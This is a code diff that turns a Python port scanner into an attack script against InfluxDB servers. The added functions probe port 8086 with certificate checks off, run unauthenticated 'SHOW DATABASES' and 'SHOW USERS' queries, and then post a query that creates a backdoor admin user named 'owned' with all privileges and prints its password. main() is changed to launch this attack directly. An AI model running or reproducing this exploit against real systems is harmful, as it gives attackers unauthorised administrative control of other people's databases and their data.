@@ -1,15 +1,11 @@
 #!/usr/bin/python3
-# PORTNINJA: PORT SCANNER DESIGNED TO PERFORM NETWORK RECON OPERATIONS
 # Get the primary IP address with a gateway
 import sys
 import socket
-import select
-import os
-import subprocess
-import argparse
-import time 
 from struct import *
-import argparse
+import requests
+import random
+import string
 
 def portNumLimit(port):
     num = int(port)
@@ -31,9 +27,10 @@ def TCPportCheck(ip_addr, port_temp):
         result = sock.connect_ex((ip_addr, port_temp))
         if result == 0:
                    print(("Port {} open".format(port_temp)))
-                   sock.close()
+                   return True
         else:
                    print(("Port {} closed".format(port_temp)))
+                   return False
         sock.close()
         return result
     except:
@@ -187,9 +184,80 @@ def port_scan(target):
         print('Performing banner grab')
         TCPbannerGrab(target, influx_port)
 
+
+def make_password():
+    lower = string.ascii_lowercase
+    upper = string.ascii_uppercase
+    num = string.digits
+    symbols = string.punctuation
+    all = lower + upper + num + symbols
+    temp = random.sample(all, 8)
+    password = ''.join(temp)
+    return password
+
+# By connecting to the target, checking if HTTP or HTTPS is running to see which protocol needs to be running. 
+def get_protocol(target): 
+    # Try to connect via https first
+    try:
+        # Don't verify anything to avoid errors and to confirm an HTTPS connection
+        https_req = requests.get(f'https://{target}:8086/query', verify=False)
+        # Return https to be used for the remainder of the attack
+        return 'https'
+    
+    # Clearly https didn't work so go further with http
+    except requests.exceptions.ConnectionError:
+        # Return http to be used for the remainder of the attack
+        return 'http'
+
+def influx_recon(target):
+    # We port scan the target to make sure it's not behind a firewall or closed. 
+    port_scan(target)
+    # Get the right protocol to automate the recon process
+    target_protocol = get_protocol(target)
+    # Main query endpoint to Influx
+    req = requests.get(f'{target_protocol}://{target}:8086/query')
+    # See if admin is enabled or not
+
+    # Sending a blank query to the page causes code 400 but the purpose is to find the page exists
+    if req.status_code == 400:
+        print("Found Influx query endpoint.\nAttempting admin based queries without credentials...")
+         # Make a POST request in which the users
+        show_db = requests.get(f"{target_protocol}://{target}:8086/query?q=SHOW DATABASES")
+        if show_db.status_code == 200:
+            print("SHOW DATABASES without credentials query successful\nDisplaying available databases")
+            print(show_db.text)
+    
+        # This query should only succeed if the default user is an admin
+        show_users = requests.get(f"{target_protocol}://{target}:8086/query?q=SHOW USERS")
+        if show_users.status_code == 200:
+            print("SHOW USERS without credentials query successful\nDisplaying available users")
+            print(show_users.text)
+        #curl -G 172.17.186.2:8086/query -u user:password --data-urlencode "q=SHOW DATABASES"
+    elif req.status_code == 404:
+        print("Influx query endpoint not found, either closed or behind a firewall")
+        return 1
+
+def influx_attack(target):
+    target_protocol = get_protocol(target)
+    print(target_protocol)
+    print("Attempting to create new user")
+    # Create random 8 character password. Function needed to make this password more complex. 
+    password = make_password()
+    # Need to create random string as password so attacker connection cannot be intercepted by defences.
+    attack_string = f"CREATE USER owned with PASSWORD '{password}' WITH ALL PRIVILEGES"
+    req = requests.post(f"{target_protocol}://{target}:8086/query?q={attack_string}", data=attack_string)
+    #req = requests.get(f"{target_protocol}://{target}:8086/query?q=CREATE USER owned WITH PASSWORD 'password' WITH ALL PRIVILEGES")
+    print(req.text)
+    # If the request is successful then give the credentials to login to start querying/injecting DB 
+    if req.status_code == 200:
+       print(f"User created\nCredentials: User: owned, Password: {password}")
+    
+
 def main():
     target = sys.argv[1]
-    port_scan(target)
+    #recon = influx_recon(target)
+    attack = influx_attack(target)
+    
 
 if __name__ == '__main__':
         main()
